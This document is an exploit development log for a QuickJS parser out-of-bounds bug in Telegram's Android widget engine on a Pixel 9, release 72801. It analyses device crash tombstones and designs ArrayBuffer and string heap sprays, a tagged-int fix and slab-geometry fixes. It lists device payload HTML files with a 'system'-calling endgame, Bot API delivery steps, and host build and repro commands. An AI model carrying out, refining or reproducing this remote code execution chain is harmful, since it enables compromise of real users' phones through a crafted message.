# Pixel 9 / release 72801 — route-2 parser crash: root cause and the 72801 port

Date: 2026-11-08. Host-only analysis (no device/Frida/bot/network used by this
worker). Device data supplied by the orchestrator: Pixel 9, Android 17
(CP3A.261005.005), Telegram **13.2.0 release 72801** (org.telegram.messenger,
uid 10290), **MTE OFF** (`arm64.memtag.bootctl=none`), crash of pid 17820,
thread `widget.sandbox` (tid 19188), 2026-11-08 01:07:40.726 CEST.
Lib pulled from the device: `/tmp/opencode/pixel72801_lib/libtmessages.49.so`
(27,052,872 B, sha256 `6fa06f2699350bec1f55ae8a00c74a1267b81e242bf2b44839612638dd1be61c`,
Build-ID `ecb6bff684aab8ecf5b54f80ca330f275d51ec88`); copy kept at
`lab/pixel72801_route2/lib/`.

All paths relative to `telegramandroidwidget/` unless absolute.

---

## 0. Verdict (short)

1. **The crash is not an MTE fault and not a wrong ABI.** MTE is off
   (`arm64.memtag.bootctl=none`; the signal is a plain `SIGSEGV/SEGV_ACCERR`,
   not `SEGV_MTESERR`). The 72801 release lib contains the **identical**
   QuickJS fork pieces the route 2 needs: the 31-entry arena class table
   (`…352, 384, 416, 448, 480, 512`), the 64 KiB `JS_ARENA_SLABS` `mmap`
   (`mmap(NULL, 0x10000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0)`)
   and the **byte-identical `add_closure_variables` OOB loop**. The crash PC
   is that loop, and the register arithmetic proves the target was computed
   exactly as designed: `vd = b + 1,310,828 = b->vardefs + 20*(1+65534)`.
2. **The crash is a slab-geometry failure**: the 64 KiB arena slab **20 slabs
   above `b`'s slab is not a readable mapping** on the device run
   (`SEGV_ACCERR`, ESR `DFSC=6` = translation fault with a VMA that has no
   read permission → the target page is `PROT_NONE`/outside the arena run).
   The route 2 put **all** spray slabs *before* `b`; the host (`x86-64`) maps
   slabs **downwards**, so the target (+20 slabs) lands inside the spray,
   while on the Android device the run evidently extended the other way (or
   was not contiguous past `b`), so the target fell outside it.
3. **Second device round (16717–16722)**: the bidirectional AB spray fixed
   the *slab* (16717 `NOCORR`, target mapped) but exposed the **slot class**:
   16721 crashed in `JS_DupAtom` (`PC 0x17498f0`, fault `0x1107b`) on a
   foreign page, and the target offset still depended on `b`'s block index
   (`k`) — see §9.
4. **Slot-class fix (host-proven, §10)**: make `b` **class 512** (9 cpool
   floats, BSIZE 504) so the target is at user offset **252 of block k for
   every k**, and spray **479-char strings** (one string = one class-512
   block) so the +20-slab slab is **16/16 class-512** — the target page is
   always ours, the 16721 crash mode impossible. Host: forge
   `ABLEN[599]=327744` 3/3. Device files:
   `payload/s2s_probe_72801.html` (**1,654 raw / 728 zlib9**, safe probe,
   no endgame) and `payload/s2s_device_72801.html` (**9,152 / 3,856**,
   stage A + dynamic endgame; the endgame anchor is heap-layout-bound and
   stops safely at `NOANCHOR` on the host string heap). §10.4 is the exact
   two-message device test.
5. **DEVICE MILESTONE**: the corrected probe (`s2s3_probe_72801.html`,
   686 zlib9) **hit on the Pixel 72801 with MTE off**:
   `S1 ABLEN[599]=327744 VLEN=327744 END=-`. The parser route 2 is
   device-proven on the release build. The step-2 widget crashed in stage A
   because the larger page shifted the arena pre-heap; the fixed step 2
   (`payload/s2s4_device_72801.html`, 3,874 zlib9) keeps stage A
   byte-identical and defers the endgame to a non-executable sibling script
   (`type="text/plain"`) evaluated after stage A (§14).
6. **16729 and the final priming design (§19)**: s2s9 gave a **safe
   `NOCORR`** - NP=3600 fixed the foreign/geometry, and the remaining miss is
   the record/slot, caused by the 3k *object* priming shifting the arena.
   Final design primes the GC with **Scudo strings** (1500 x 2 KB) + one
   object: one pre-spray GC (`a512=0`, threshold 4.9 MB), spray/eval
   GC-free, arena layout probe-like, NP=2600 ->
   `payload/s2s10_device_72801.html` (**9,187 / 3,881 zlib9**); host stage A
   `ABLEN[599]=327744` 3/3 on the exact file (8 MiB and 6 MiB), TSLOTS all
   512, full chain `END=HF OK` + 162 B proof 2/2.
7. **16728 and the calibration decision (§18)**: the 3k priming made s2s8
   lighter but the device still hit a foreign class-512 page; the priming
   fixes the GC trigger, not the **mixed prefix** at the top of the spray
   run. Chosen calibration (not blind): NP=3600 (32 slabs, ~12 mixed-slab
   tolerance) with the light 3k priming ->
   `payload/s2s9_device_72801.html` (**9,175 / 3,877 zlib9**); host stage A
   `ABLEN[599]=327744` 3/3 on the exact file (8 MiB and 6 MiB), TSLOTS all
   512, full chain `END=HF OK` + 162 B proof 2/2. If it still hits a foreign
   page, the in-HTML calibration is exhausted and the next step is the
   out-of-band endgame (`TelegramWidget.request`) with the probe HTML
   byte-identical.
7. **16727 and the reduced priming (§17)**: the 30k-object GC priming that
   fixed the spray was itself too heavy on the device (widget stopped; the
   later tagged `SEGV_ACCERR` is a cold re-open foreign page, not the
   endgame). Reduced priming (3,000 objects x 1 KB, ~3 MB live) keeps the
   spray and eval GC-free with 1/10 of the object work: 
   `payload/s2s8_device_72801.html` (**9,175 / 3,876 zlib9**), stage A
   `ABLEN[599]=327744` 3/3 on the exact file (8 MiB and 6 MiB), full chain
   `END=HF OK` + 162 B proof 2/2, 3.18 MB at trigger.
7. **Step-2 first GC fix (§16)**: both first step-2 layouts crashed in stage A
   because `JS_RunGC` fires **inside the string spray** and `js_arena_trim`
   destroys slabs / returns engine pages (16725 `MAPERR` hole, 16726 foreign
   class-512 page with `var_name=0x17ffffef`). Fixed by **GC priming**
   (30k short-lived objects before the spray): the spray is GC-free and the
   layout is stable. `payload/s2s7_device_72801.html` (**9,168 / 3,874
   zlib9**): stage A `ABLEN[599]=327744` 3/3 on the exact file (8 MiB and
   6 MiB), full chain `END=HF OK` + 162 B proof 3/3, 34-41 ms.
7. **16723 (corrected probe)**: the device registers confirm the class-512
   layout (`x12 = b+0x110`) and the offset (user 252 / data 228), and the
   tombstone's `"<input>"` atom proves `sizeof(JSString)=24` (479-char
   strings are class 512). The read `"NSs3"` shows the target page was a
   **foreign string page** -> placement, not offset. Fix: **tagged-int
   `var_name` (0x80000004)** makes `JS_DupAtom` a no-op and removes the
   Symbol pre-grow entirely (-1.55 MB, 3.03 MiB heap, 32 fewer slabs); host
   forge 3/3 and full chain `END=HF OK` 3/3. New device files:
   `payload/s2s3_probe_72801.html` (**1,566 raw / 686 zlib9**, safe probe)
   and `payload/s2s3_device_72801.html` (**9,064 / 3,814**). §12 is the
   analysis and the exact test.

---

## 1. The crash, exactly

Tombstone `data_app_native_crash`, 2026-11-08 01:07:41, excerpt at
`lab/pixel72801_route2/crash_tombstone_excerpt.txt`:

```
signal 11 (SIGSEGV), code 2 (SEGV_ACCERR), fault addr 0x0000006e77839d08 (read)
esr 0000000092000006          tagged_addr_ctrl ...0001 (PR_TAGGED_ADDR_ENABLE)
x8=0x14  x9=0xe8  x10=0xfffe  x11=0xffff  x12=0x6e776f9d18  x13=0x6e77839d04
x14=0x8  x24=0x6e776f9c98     lr=0x6ec106182c  pc=0x6ec106186c
#00 0x174986c  #01 0x1719e94  #02 0x170c380  #03 0x170b84c
#04 0x17334e0  #05 0x1749fd0  #06 0x17ac85c  #07 0x77ab34 …
```

(PC offsets are lib-relative: lib base `0x6ec106186c - 0x174986c = 0x6eaf9c0000`.)

### 1.1 The faulting instruction is the parser bug

`.eh_frame` puts `#00` in the 3,260-byte function `0x174956c..0x174a228`, which
is `__JS_EvalInternal` with `add_closure_variables` inlined
(`lab/.../verify_72801.py` re-derives this). At the crash PC:

```
174985c: ldrh w11, [x24, #0x38]     ; b->arg_count            = 1
1749860: ldr  x12, [x24, #0x28]     ; b->vardefs              = 0x6e776f9d18
1749864: add  w11, w11, w10, uxtw   ; arg_count + i,          i = 0xfffe
1749868: madd x13, x11, x8, x12     ; vd = vardefs + 20*65535
174986c: ldr  w13, [x13, #4]        ; vd->scope_level  <-- FAULT
```
with `x8 = 20`, `x10 = 0xfffe` (65534), `x11 = 0xffff` (65535 = 1 + 65534).

Register arithmetic, exact to the byte:

| value | address |
|---|---|
| `b` (x24) | `0x6e776f9c98` |
| `b->vardefs` (x12) | `0x6e776f9d18` = `b + 0x80` |
| `vd` (x13) | `0x6e77839d04` = `vardefs + 0x13FFEC` = `b + 1,310,828` |
| fault | `0x6e77839d08` = `vd + 4` = `&vd->scope_level` |

`b+1,310,828` is exactly the route-2 formula
`vardefs + 20*(arg_count + 65534) = b + 0x80 + 1,310,700`. The block header at
`b-8` is `09 00 19 01 01 00 00 00` → `block_idx = 9`, `block_size_idx = 0x19 =
25` → `arena_block_sizes[25] = 352`, refcount 1: **`b` is an arena class-352
block at block index 9**, exactly as the port assumes. `b+0x38` holds
`arg_count=1, var_count=6` (the c2560s victim geometry). So on 72801:

* the parser bug is present and is reached from ordinary JS,
* `JSFunctionBytecode` is 128 bytes with `vardefs` at `b+0x80`,
* `JSVarDef` is 20 bytes, `scope_level` at `+4`,
* the OOB index is `arg_count + 65534` — **all the route-2 constants are
  correct on the release build**.

### 1.2 The signal

`SEGV_ACCERR` + ESR `0x92000006`: EC `0x24` (data abort from lower EL), WnR=0
(read), DFSC `0b000110` = translation fault, level 2. On Linux/arm64 a
translation fault is reported as `SEGV_MAPERR` when no VMA covers the
address; `SEGV_ACCERR` is returned when a VMA **exists but does not allow the
access** (e.g. `PROT_NONE`). So the target page `0x6e77839000` was **not an
arena slab**: it was outside the mapped arena run, in a reserved/`PROT_NONE`
region. There is no tag involvement (MTE off, tag 0 pointer, DFSC has no tag
check bit).

### 1.3 Why the target missed: the spray was one-sided

The route 2 relied on the target slab being a *sprayed* slab. The host
measurement (`lab/qjs_fork_audit/mte_route2_20261108`, x86-64) shows why that
was true there and not here:

```
MTE2T INSLAB t_slab_idx=44 b_slab_idx=64 t_base=0x7f65c5fb9000
      b_base=0x7f65c5e79000 slab_delta=1310720
```

On x86-64 Linux, anonymous `mmap`s come from the top-down region: each new
64 KiB slab is **lower** than the previous one. `b` (allocated after the
spray) is in slab 64, the *lowest* slab so far; +20 slabs is slab 44, an
*older* sprayed slab. The host run had 69 slabs, so the target was 25 slabs
inside the spray.

The device run has the opposite arrangement at that point: `b`'s slab base is
`0x6e776f0000` (page `0x6e776f9000`, block 9) and `b + 20*64 KiB =
0x6e77830000` is a `PROT_NONE`/unmapped region. Two consistent readings:

* the 64 KiB slab `mmap`s on this Android 17 process grew **upwards**
  (bottom-up), so `b`'s slab — the newest — is the **highest** slab and
  +20 slabs is past the top of the run; or
* `b`'s page was taken in a slab that is not adjacent (at +20) to the spray
  run.

Either way the one-sided layout is the defect. (The other registers fit:
`x0 = 0x6e76536638` is the just-allocated 56-byte `closure_var` block, in a
class-64 arena page ~2.2 MB below `b`, i.e. the arena run spans ≳35 slabs —
consistent with a long run that simply does not extend above `b`.)

**MTE is irrelevant to this crash** — it is a plain geometry miss with a
`PROT_NONE` target. The same widget would crash identically with MTE on.

---

## 2. The 72801 release lib carries the exact fork pieces

`lab/pixel72801_route2/verify_72801.py` (output
`logs/verify_72801.txt`), all offsets lib-relative:

| check | 72801 release (27,052,872) | 72889 beta (27,069,808) | 72929 beta (27,070,032) |
|---|---|---|---|
| arena class table (`31×u16`, ends `…480,512`) | **0x410236** | 0x414236 | 0x414236 |
| `arena_slab_take` slab `mmap` (`w1=#0x10000`, `w2=#3`, `w3=#0x22`, `w4=#-1`) | **0x17079ec** | yes | yes (0x170bb2c) |
| `add_closure_variables` loop signature (20 B) | **0x174985c** (unique) | 0x174d99c | 0x174daa4 |
| `JSFunctionBytecode` vardefs at `b+0x28`→`b+0x80`, stride 20 | yes | yes | yes |
| `arg_count` at `b+0x38`, `scope_level` at `vd+4`, `scope_next` at `vd+8` | yes | yes | yes |

So the release 72801 is the **same QuickJS-ng 0.17 fork generation with
`JS_ARENA_SLABS`** as the betas; the previous note's "inferred from strings"
caveat is now resolved by code. The only difference that matters is the
device-side slab layout, not the engine.

Additional corroboration that the same code is live on the device: the crash
PC is this function and the block header says class 352 (see §1.1).

---

## 3. The port: bidirectional spray

### 3.1 Design

The OOB is always `b + 1,310,700 + 0x80` (20 slabs + 0x6C); `argc` only moves
it further (0…20 more slabs). Nothing in JS can learn the mmap direction or
the arena base, so the spray must cover **both sides** of `b`:

```
pre-spray  NP = 1800 × ArrayBuffer(488)   (~21 slabs of class-512 data)
           + N2 = 415 × ArrayBuffer(320)  (class-352 filler, b's page)
           + eval(S)                       -> b (class 352, runtime function)
post-spray NQ = 2400 × ArrayBuffer(488)   (~28 slabs, other side)
           + D/T class-64 groom (600+600, T[598]=null)
           + fill + phase sweep + trigger
```

The 20th slab above `b`'s slab is then inside the spray whichever way the
run grows. The T/D groom was moved **after** the post-spray so that the
closure-var allocation still reuses `T[598]`'s freed class-64 block
immediately before `T[599]`.

Heap (measured at the first trigger, host): **5,395,808 B = 5.15 MiB**,
including the 65,600-Symbol atom pre-grow (needed so a phase read of
`var_name = 65535` is a valid atom and cannot crash in `JS_DupAtom`). The
widget limit on this app is 8 MB (the engine's own "Memory limit exceeded
(8 MB)" formatting, lib string `Memory limit exceeded (` @0x20ebbc), so
there is ~2.8 MB of headroom; the stage even forges at a 6 MiB cap on the
host.

### 3.2 Host results

`lab/pixel72801_route2/logs/host_chain_s2b.txt`:

| test | result |
|---|---|
| stage A (single eval, 8 MiB), 3 runs | `ABLEN[599]=327744 ph=12 q=1 n=8 VLEN=327744`, 3/3 |
| geometry (instrumented arena) | `b_slab_idx=35`, `t_slab_idx=17`, `slab_delta=1310720`, slot 4; 74 slabs |
| full chain with the host endgame, 8 MiB, 3 runs | `END=HF OK` + **162-byte proof**, 3/3 |
| full chain, 6 MiB | stage A forges (5.15 MiB used) |
| device HTML with the dynamic Android endgame, host | stage A forges; endgame stops at `NOANCHOR` (host-only: the host `js_free` anchor does not resolve to a bionic libc) — expected, the same stage B is the device/v7 code path |

### 3.3 Device payload

```
lab/pixel72801_route2/payload/s2b_device_72801.html
  raw 9,431 B   zlib9 3,964 B   (limit 32,768 / 4,096)
  sha256 f269447843c422f2629abe524806dbc8d7f2caeddbe21fa62857cc44b7478f2d
  CMD  id>/data/data/org.telegram.messenger/files/n1   (release package)
  endgame: dynamic ELF/GNU-hash `system` resolver (js_free anchor),
           unchanged from the c2560s family; it writes the victim pointers
           as full 64-bit words (Rf() splits the Number into two 32-bit
           halves), and MTE-off makes the tag question moot anyway.
```

Stage A source: `lab/pixel72801_route2/payload/s2b_stageA.js` (and
`lab/qjs_fork_audit/mte_route2_20261108/poc/s2b_stageA.js`). Host full chain
HTML: `payload/s2b_full_host.html` (6,015 zlib9, host endgame, proof).

---

## 4. What each device outcome means

| device result | meaning | next step |
|---|---|---|
| marker `S1 ABLEN[599]=327744 …` and `END=HF OK` | full chain (stage A + endgame) works on 72801 | C2 complete |
| `S1 ABLEN[599]=327744 … END=HF ERR <reason>` | stage A forged on 72801; endgame failed at `<reason>` (ELF lookup, anchor, GOT) | fix the endgame stage only (no crash) |
| `S1 NOCORR END=…` (no crash) | the target slab **is** mapped but the record/phase or the slot class missed | resend with the phase/slot variants in §5.3 |
| crash, PC again `0x174986c`, fault `= b+1,310,832` | target page still outside the arena run → the spray did not reach +20 slabs (post-spray too small, or `b` not adjacent) | increase NQ and/or force `b` into the boundary slab (§6.1) |
| crash at a different PC | the target page was foreign (slot class) or the endgame | tombstone PC + maps decide; §6.2 |

The marker is written by stage C into the `#v` div of the widget, so it is
visible in the message itself; logcat is not required to read it, but a
tombstone is required for a crash.

---

## 5. Exact device test (first round; **superseded by §10.4** for the current device test)

1. Payload: send **`lab/pixel72801_route2/payload/s2b_device_72801.html`**
   (9,431 raw / 3,964 zlib9) with the release Bot API prefix
   (`sendWidget`, `application/json`, `chat_id` + raw `html`) as a **new
   message** (16684/16685 are deleted; this is a new one). The release
   package path is already in the CMD.
2. Expect one of the four non-crash outcomes in §4 within the 300 ms quota
   (host: 75 ms for the symbol stage; the widget may take a few seconds for
   the 4,200 AB + 65,600 Symbol setup).
3. If it crashes, pull the tombstone (`adb shell dumpsys dropbox --print
   data_app_native_crash` or `adb pull /data/tombstones/…` as available) and
   read: `signal`, `fault addr`, `pc`, `x10/x11/x12/x13/x24`. Compare
   `x24` (=b), `x13 - x12` (= 0x13FFEC expected) and `fault - x13` (= 4).
   Also pull `/proc/<pid>/maps` if the process is still alive, or the
   tombstone memory map, for the VMA name at the fault page.
4. Do not resend after a crash without the tombstone: the fault address
   decides between "spray did not reach" (§6.1) and "foreign page" (§6.2).

### 5.1 If `NOCORR` (no crash)

The slab is now mapped but the record/slot missed. The `N2` class-352 filler
is the cheapest geometry knob: it moves `b`'s block index (and hence the
target page offset) without touching the spray. Pre-built, all 9,431 raw /
≤3,965 zlib9:

* `payload/s2b_n2_440.html` — host hit `ph=4 q=1 n=4`,
* `payload/s2b_n2_385.html` — host hit `ph=4 q=1`,
* `payload/s2b_n2_405.html` — host hit `ph=12 q=1`,
* `payload/s2b_n2_425.html` — host hit `ph=12 q=1`,
* `payload/s2b_np_1500.html` — NP = 1500, shifts the boundary slab ~5 slabs,
* `payload/s2b_nq_3200.html` — NQ = 3200 (+0.4 MB), use if §5.3 (same-address
  crash) points at "spray does not reach".

Host N2 sweep with the new geometry (`logs/n2_sweep_host_s2b.txt`):
hit 385/400/405/415/425/440; NOCORR 380/410/420/430; **crash 390** (a
non-512 target slot on the host — the same slot-class failure mode as §6.2,
and the reason 390 is not shipped).

### 5.2 If the marker shows `END=HF ERR`

Only stage B failed; the parser is ported. Report the error token
(`NOANCHOR`, `NOV`, `NOGOT`, `NOELF`, `NOSYM`, `NOSYS`, `BADGNU`, …); the
stage A part is done.

### 5.3 If it crashes at `0x174986c` again

Increase the post-spray (`NQ`) first (the ascending case needs ≥20 slabs
*after* `b`'s slab; the eval can consume 1–3 slabs between `b` and the
post-spray). `NQ = 3200` costs ~0.4 MB more (still < 8 MB).

---

## 6. Remaining risks (honest)

### 6.1 Slab adjacency is now two-sided but not proven on device

The host cannot choose its mmap direction, so only the pre-spray side is
exercised here (the host hit is `t_slab_idx=17 < b_slab_idx=35`). The
post-spray side is the same allocation loop on the other side of `b`; the
only asymmetry is that the eval (1–3 slabs) sits between `b` and the
post-spray. `NQ = 2400` (~28 host slabs) leaves ~8 slabs of margin.
If the device still faults at the same offset, the next step is to *force*
`b` into the boundary slab: allocate the class-352 filler (N2) **after** a
`NQ`-sized class-512 run and before `b` so the class-352 page is created in
the freshly-created slab (variant `s2b_n2last.html`, not shipped yet).

### 6.2 Slot class

The target page is page `s_b` (the same slot index as `b`'s page) of the
slab 20 away. With `ArrayBuffer(488)` sprays the slab composition on the
host is ~12/16 class-512 pages and 4/16 engine classes (112/64/56). If the
device's `s_b` is one of the engine slots, the fake `JSVarDef` is garbage:
it may NOCORR (safe) or follow a wild `scope_next` (crash). This is the
largest remaining unknown and the reason a pure-class-512 spray (strings,
which produce 16/16 class-512 slabs on the host, measured
`lab/.../probe_str3`) is the next engineering step; strings are immutable,
so they need a per-block phase cycle, which is why they are not in this
first device payload.

### 6.3 Endgame

Stage B is the same dynamic resolver as the c2560s family (proven on Sony
72929) and the same ELF/GNU-hash technique as the v7 C2 payload proven on
this Pixel (`tg-10290-Pixel_9`, MTE on). It was never reached in the
crashed runs. If it fails, it fails with a marker, not a crash (the whole
stage B is inside `try/catch`).

### 6.4 Heap / quota

5.15 MiB at the trigger (host), 8 MB limit, 300 ms quota (host 75 ms).
Comfortable. The 65,600-Symbol pre-grow is required for phase safety
(`var_name = 65535` must be a valid atom).

---

## 7. Artifacts

```
notes/pixel72801_route2_crash_20261108.md        this note
lab/pixel72801_route2/
  lib/libtmessages.49.so            72801 release lib (sha256 6fa06f26…, Build-ID ecb6bff6…)
  libs/libtmessages.49.so           72889 beta lib (comparison)
  crash_tombstone_excerpt.txt       the 2026-11-08 01:07:41 tombstone
  verify_72801.py                   lib verification (class table / slab mmap / ACV loop / FDEs)
  logs/verify_72801.txt             its output (72801 vs 72889 vs 72929)
  logs/host_chain_s2b.txt           host chain 6/6, proof, 6 MiB check
  logs/variant_sweep_host.txt       payload variants on the host
  logs/n2_sweep_host_s2b.txt        N2 -> hit/NOCORR/crash geometry sweep
  gen_s2b.py                        generator (NP/NQ/N2, --host)
  payload/s2b_device_72801.html     AB-spray payload (superseded by s2s)
  payload/s2s_probe_72801.html      SAFE SLOT PROBE: 1,654 raw / 728 zlib9 (send first)
  payload/s2s_device_72801.html     STRING PAYLOAD + endgame: 9,152 raw / 3,856 zlib9
  payload/s2s_full_host.html        string stage A + host endgame (forge only)
  payload/s2s_stageA_dev.js         string stage-A source
  gen_s2s.py                        string payload generator
  logs/s2s_string_variant.txt       host evidence for §10
  payload/s2b_n2_{385,405,425,440}.html   N2 geometry variants (≤3,965 zlib9)
  payload/s2b_np_1500.html          NP variant
  payload/s2b_nq_3200.html          NQ variant (larger post-spray)
  payload/s2b_stageA.js             stage A source (bidirectional spray)
  payload/s2b_full_host.html        host full chain (host endgame, 162 B proof)
lab/qjs_fork_audit/mte_route2_20261108/
  poc/s2b_stageA.js, poc/s2b_stageA_dev.js, poc/s2b_full_host.html,
  poc/s2b_device_72801.html, poc/probe_str3.js, poc/probe_ab*.js
  src/quickjs.c                     + MTE2_ALLSLOTS dump, mte2_dump_public
```

Repro:

```bash
cd lab/qjs_fork_audit/mte_route2_20261108
gcc -O2 -g -DNDEBUG -I src harness.c src/quickjs.c src/libregexp.c \
    src/libunicode.c src/dtoa.c -lm -o build/run6m2
./build/run6m2 -l 8 poc/s2b_stageA.js          # ABLEN[599]=327744
./build/run_sib_plain -l 8 poc/s2b_full_host.html   # END=HF OK, 162 B proof
python3 ../../lab/pixel72801_route2/verify_72801.py --lib ../../lab/pixel72801_route2/lib/libtmessages.49.so
```

---

## 9. Device series 16717–16722 (2026-11-08 evening): what each result means

The second device round used the bidirectional AB(488) payload and its N2
variants. Results and reading:

| msg | payload | device result | reading |
|---|---|---|---|
| 16717 | `s2b_device_72801` (N2=415, NQ=2400) | **`S1 NOCORR`**, no crash | target slab **was mapped** (two-sided spray works), and the sweep found no record: either the target page was ours but the target offset was a zeroed tail (`k` = 4 or 10 in the AB geometry) or the page was foreign-but-zero. **Safe.** |
| 16718 | `s2b_n2_440` | crash, PC `0x174986c`, fault `b+1,310,832` | geometry: the target slab 20 above `b` was outside the run (N2 moved the boundary slab). |
| 16720 | `s2b_n2_385` | `Widget stopped`, then crash on reopen, fault `0x761cc61388`, PC `0x174986c` | geometry (same family). |
| 16721 | `s2b_n2_405` | crash, fault **`0x1107b`**, PC **`0x17498f0`** | **target mapped, slot class foreign.** `0x17498f0` is `ldur w15,[x14,#-4]` — the `JS_DupAtom` refcount increment on `x14 = rt->atom_array[var_name]`. The array load (`0x17498ec`) succeeded, so `var_name` was inside the atom-array capacity, but the slot held a non-pointer (`0x1107f`, the atom-array **hole** region beyond `atom_count`), i.e. the fake record was not ours. |
| 16722 | `s2b_np_1500` | crash (tombstone in the orchestrator log) | assumed same family (N2/NP changes moved `b`'s page/slot). |

**Conclusion of the round:** the two-sided spray solved the *slab* problem
(16717 shows the +20 slab mapped); the remaining failure is the **slot
class** of the target page (16721) plus the fact that `b`'s block index `k`
(and therefore the target page offset) was still payload/geometry dependent
(16717 NOCORR). Blind N2/NQ sweeps only move both unknowns at once, which is
why they are stopped.

### 9.1 How 16721 crashed, exactly

```
17498ec: ldr x14, [x14, w10, uxtw #3]   ; x14 = rt->atom_array[var_name]  (succeeded)
17498f0: ldur w15, [x14, #-4]           ; refcount++ on the atom  <-- fault 0x1107b
```
`x14 = 0x1107f` is not a heap pointer: it is the content of an *unused*
atom-array slot (the array is grown without zeroing, so entries in
`[atom_count, atom_size)` are heap garbage). The 65,600-Symbol pre-grow
covers indices `< atom_count` only; it cannot sanitise a foreign page whose
`var_name` falls in the hole. **No phase/symbol trick can make a foreign
target page safe** — the only safe fix is to make the target page *ours*
(see §10).

## 10. Slot-class fix: class-512 `b` + pure class-512 string slabs

Two independent changes, both host-proven:

### 10.1 `b` in class 512 makes the target offset `k`-independent

`JSFunctionBytecode` has the cpool inline before `vardefs`, so with 9
distinct float constants in the body the struct is `BSIZE = 504` (class 512,
verified: 0 floats 344, 2 floats 376, 4→408, 6→440, 9→504, 12→544 = large).
With a class-512 `b` (block size 512, user at `page+56+512k`):

```
vardefs = b + 0x110          (0x80 + 9*16 cpool)
vd      = b + 1,310,972      (= vardefs + 20*(1+65534))
target  = page + 308 + 512k  -> within block k at user offset 252, for EVERY k
```

i.e. the target page offset is the same for all 7 block indices — no N2
sweep, no phase sweep, no dependence on `k`.

### 10.2 A 479-char string is a single class-512 block -> pure slabs

`sizeof(JSString)=24`, allocation `24+len+1(+8 header)`; len 479 gives
exactly 512 -> arena class 512. `String.fromCharCode.apply(null, U)` creates
one such block per call and nothing else, so a string slab is **16/16
class-512 pages** (measured: `MTE2AS` all 512, `probe_str3`; and in the real
payload `TSLOTS 0..15 = 512`). The +20-slab target page is therefore always
our data, whatever slot `b`'s page occupies — the 16721 crash mode is
impossible.

Record placement: string data starts at user+24, so the target data offset is
`252-24 = 228`; `228 = 28 + 5*40`, so the stage-A pattern places
**RJ (scope_next=65535) at data 228** and **RT (scope_next=4) at 248** ->
two overflow writes (`cv[7]`, `cv[8]`) -> `T[599].byteLength = 327744`.

### 10.3 Host results

| payload | size (raw / zlib9) | host |
|---|---|---|
| `payload/s2s_probe_72801.html` (stage A + marker, **no endgame**) | 1,654 / **728** (sha256 `25a7d121808bde8f…`) | `S1 ABLEN[599]=327744 VLEN=327744 END=-` **3/3**, also at 6 MiB |
| `payload/s2s_device_72801.html` (stage A + dynamic endgame) | 9,152 / **3,856** (sha256 `a8407cfc6ed6cf78…`) | stage A forges (2/2); endgame stops at `HF ERR NOANCHOR` (safe, `try/catch`) |

Geometry of the string run (instrumented host): `t_slab_idx=10`,
`b_slab_idx=28`, `slab_delta=1,310,720`, target block `bidx=4`, user offset
252, `TSLOTS` all 512, msize 4.07 MB.

### 10.4 Device test (two messages, in this order)

1. **`payload/s2s_probe_72801.html`** (728 zlib9) — the safe slot-class
   probe. Non-destructive by construction (pure class-512 slab; a miss is
   `NOCORR`, and the marker is rendered by stage C):
   * `S1 ABLEN[599]=327744 VLEN=327744 END=-` -> **the parser route 2 works
     on 72801 without MTE**: slot class, target offset and forge are all
     confirmed. Send the full payload next.
   * `S1 NOCORR END=-` -> the target slab was mapped but the record missed
     (device `b` offsets differ from the host's cpool layout); report and
     the next step is to read `x24/x12` from a *containment* run.
   * crash at `0x174986c` with fault `= b+1,310,972+4` -> the +20 slab was
     outside the run; increase NP/NQ by one slab each (2,712) — do **not**
     change N2.
2. **`payload/s2s_device_72801.html`** (3,856 zlib9) — only after the probe
   reports `ABLEN`. It runs the same stage A and then the dynamic Android
   endgame. On the host heap the endgame's anchor (forged AB struct or the
   `Uint8Array` view within `V[0,0x2000)`) is not found because the string
   spray changes the class-64/72/112 layout; on the device the layout may
   differ. A failure is the safe marker `END=HF ERR NOANCHOR …`, not a
   crash. If so, the anchor scan in stage B is the only remaining work.

**Do not** resend the AB-spray N2 variants: 16721 shows a foreign slot is
possible there and it is not safely probeable.


---

## 12. 16723 (corrected probe) analysis and the tagged-int fix

### 12.1 What the 16723 registers prove

```
x24 = b        = 0x71f8f6b238     x12 = vardefs = 0x71f8f6b348 = b + 0x110
x8  = 20       x11 = 0xffff       x14 = 0xb400006e80869fa8 = rt->atom_array
x10 = 0x3374534e ("NSs3")         PC  = 0x17498ec (atom_array[var_name] load)
```

* `x12 = b + 0x110` **confirms the class-512 cpool layout on the device**
  (vardefs = 0x80 + 9 x 16), so the 9-float `b` and the k-independent target
  are real.
* `vd = vardefs + 20*(1+65534) = b + 1,310,972`; `b` page offset 0x238 ->
  target page offset **0x334 = user 252**, string data offset **228** — the
  record offset used by the probe was **correct**.
* The tombstone's `"<input>"` atom at `0x71fc3ab1f0` has its character data
  at `0x71fc3ab208`, i.e. at **+24**: `sizeof(JSString) = 24` on the device
  (no `ENABLE_DUMPS`), so a 479-char string is exactly a class-512 arena
  block. The spray-class assumption is right too.
* The 4 bytes read at data 228 were `4e 53 73 33` = `"NSs3"`, a **string
  content**, not our RJ record (`04 00 00 00 ...`). The target page was a
  **foreign class-512 string page**, not our spray. **The failure is
  placement, not offset.**

### 12.2 The fix: tagged-int `var_name`, no atom dependency

`JS_DupAtom()` returns immediately for tagged ints
(`__JS_AtomIsConst(v)` = tagged-int or `v < JS_ATOM_END`). Putting
`var_name = 0x80000004` in the fake record makes the atom path a **no-op**:

* our fake record can no longer crash in `JS_DupAtom` — no atom-array load,
  no hole, no refcount deref;
* the **65,600-Symbol pre-grow is no longer needed** (it existed only to make
  `var_name = 65535` a valid atom). Dropping it removes ~1.55 MB and ~32
  arena slabs, simplifying the layout (fewer non-spray slabs around `b`).

The forge is unchanged: the two fake records still advance the closure list,
and the in-bounds overflow writes (`cv[7]`, `cv[8]`) still land on
`T[599]` -> `byteLength = 327744`.

### 12.3 Host validation (corrected design)

| test | result |
|---|---|
| `s2s3` stage A, 8 MiB, 3 runs | `ABLEN[599]=327744 VLEN=327744` **3/3** |
| `s2s3` stage A, 6 MiB | forges |
| heap at trigger | **3,175,104 B = 3.03 MiB** (was 4.07 with symbols) |
| geometry | 54 slabs, `t_slab_idx=5`, `b_slab_idx=25`, delta 1,310,720, target slot 11 (pure 512), target user 252 / data 228 |
| full chain, host endgame, 3 runs | `END=HF OK` + **162 B proof**, 3/3 |
| device payload (dynamic Android endgame) on host | stage A forges; `END=HF ERR NOANCHOR …` (host-only: the Android ELF resolver cannot run on the host) |

### 12.4 Device files and test

1. **`lab/pixel72801_route2/payload/s2s3_probe_72801.html`** — **1,566 raw /
   686 zlib9** — stage A + marker only (**no endgame**), new message.
